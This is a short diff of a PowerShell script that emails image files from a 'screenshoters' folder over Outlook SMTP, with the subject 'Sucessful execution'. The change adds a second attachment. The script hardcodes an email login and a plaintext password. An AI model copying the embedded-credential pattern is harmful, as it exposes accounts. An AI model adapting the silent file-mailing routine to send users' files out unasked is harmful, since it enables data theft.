@@ -4,12 +4,15 @@ $Subject = “Sucessful execution”
 $Body = “placeholder"
 $EmailUsr = "stevensmith23464@outlook.com" 
 $EmailPass = "password12354"  
-$Attachments = 'C:\Users\yuri\Downloads\screenshoters\vfood.jpg'
+$Attachments = 'C:\Users\yuri\Downloads\screenshoters\vfood.jpg' 
+$Attachment2 = 'C:\Users\yuri\Downloads\screenshoters\LT-cow.jpg'
 $SMTPServer = “smtp.outlook.com”  
 $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
 $SMTPClient.EnableSsl = $true 
 $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body) 
-$attach = New-Object System.Net.Mail.Attachment($Attachments) 
+$attach = New-Object System.Net.Mail.Attachment($Attachments)  
+$SMTPMessage.Attachments.Add($attach) 
+$attach = New-Object System.Net.Mail.Attachment($Attachment2) 
 $SMTPMessage.Attachments.Add($attach) 
 $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailUsr, $EmailPass); 
 $SMTPClient.Send($SMTPMessage) 
